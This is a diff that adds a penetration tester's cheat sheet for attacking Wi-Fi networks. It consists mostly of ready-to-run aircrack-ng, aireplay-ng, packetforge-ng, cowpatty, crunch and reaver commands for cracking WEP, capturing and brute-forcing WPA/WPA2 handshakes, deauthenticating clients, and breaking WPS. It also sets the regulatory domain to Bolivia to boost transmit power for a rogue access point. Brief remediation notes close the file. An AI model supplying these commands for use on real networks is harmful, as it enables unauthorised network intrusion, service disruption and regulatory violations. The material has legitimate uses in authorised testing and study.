@@ -1,0 +1,108 @@
+﻿WEP attack with aircrack-ng suite.
+----------------------------------
+
+airmon-ng start wlan0 <AP Channel>
+airodump-ng -c <AP Channel> --bssid <AP MAC> -w <filename> wlan0mon
+aireplay-ng -1 0 -e <AP ESSID> -a <AP MAC> -h <Attacker MAC> wlan0mon
+aireplay-ng -3 -b <AP MAC> -h <Attacker MAC> wlan0mon # ARP Replay
+aireplay-ng -0 1 -a <AP MAC> -c <Client MAC> wlan0mon
+aircrack-ng -0 <filename.cap>
+
+airmon-ng start wlan0 <AP Channel>
+airodump-ng -c <AP Channel> --bssid <AP MAC> -w <filename> wlan0mon
+aireplay-ng -1 0 -e <AP ESSID> -a <AP MAC> -h <Attacker MAC> wlan0mon
+aireplay-ng -5 -b <AP MAC> -h <Attacker MAC> wlan0mon
+packetforge-ng -0 -a <AP MAC> -h <Attacker MAC> -l <Source IP> -k <Dest IP> -y <xor filename> -w <packet filename>
+tcpdump -n -vvv -e -s0 -r <packet filename>
+aireplay-ng -2 -r <packet filename> wlan0mon
+aircrack-ng -0 <filename>
+
+
+WPA PSK attack with aircrack-ng suite.
+--------------------------------------
+
+airmon-ng start wlan0 <AP Channel>
+airodump-ng -c <AP Channel> --bssid <AP MAC> -w <filename> wlan0mon
+aireplay-ng -0 1 -a <AP MAC> -c <Victim MAC> wlan0mon
+aircrack-ng -0 -w <wordlist> <capture file>
+
+You can capture the handshake passively (it takes time) or de-authenticate a client.
+
+De-authentication attack
+aireplay-ng --deauth 3 -a <BSSID> -c <client_mac> mon0
+
+Deauth every client - aireplay-ng -0 5 -a <bssid> mon0
+
+Dictionary Attack
+aircrack-ng -w passwords.lst capture-01.cap
+
+Brute force Attack
+crunch 8 8 0123456789 | aircrack-ng -e "Name of Wireless Network" -w - /root/home/wpa2.eapol.cap
+
+CoWPAtty Attack
+Wordlist mode:
+cowpatty -r <Capture file> -f <wordlist> -2 -s <AP ESSID>
+
+PMK mode:
+genpmk -f <wordlist> -d <hash filename> -s <AP ESSID>
+cowpatty -r <Capture file> -d <hash filename> -2 -s <AP ESSID>
+
+Rogue Access Point Testing
+--------------------------
+
+# ifconfig wlan0 down
+# iw reg set BO
+# iwconfig wlan0 txpower 0
+# ifconfig wlan0 up
+# airmon-ng start wlan0
+# airodump-ng --write capture mon0
+
+ifconfig wlan1 down
+iw reg set BO
+ifconfig wlan1 up
+iwconfig wlan1 channel 13
+iwconfig wlan1 txpower 30
+iwconfig wlan1 rate 11M auto
+
+
+Reaver
+------
+
+airmon-ng start wlan0
+airodump-ng wlan0
+reaver -i mon0 -b 8D:AE:9D:65:1F:B2 -vv
+reaver -i mon0 -b 8D:AE:9D:65:1F:B2 -S --no-nacks -d7 -vv -c 1
+
+
+Pixie WPS
+---------
+
+airmon-ng check
+airmon-ng start wlan0
+airodump-ng wlan0mon --wps
+reaver -i wlan0mon -c 11 -b 00:00:00:00:00:00 -K 1
+
+
+Wireless Notes
+--------------
+
+Wired Equivalent Privacy (WEP)
+RC4 stream cipher w/ CRC32 for integrity check
+- Attack: 
+By sniffing an ARP packet, then replaying it to get many encrypted replies with different IVs.
+- Remediation: 
+Use WPA2
+
+Wifi Protected Access (WPA)
+Temporal Key Integrity Protocol (TKIP) Message Integrity Check
+- Attack: 
+Uses a four way handshake, and if that handshake can be captured, then a dictionary attack ban be mounted to find the Pairwise Master Key for the Access Point and client Station.
+- Remediation: 
+Use long-keys
+
+Wifi Protected Access 2 (WPA2)
+Advanced Encryption Standard (AES)
+- Attack: 
+Uses a four way handshake, and if that handshake can be captured, then a dictionary attack ban be mounted to find the Pairwise Master Key for the Access Point and client Station.
+- Remediation:
+WPA-Enterprise
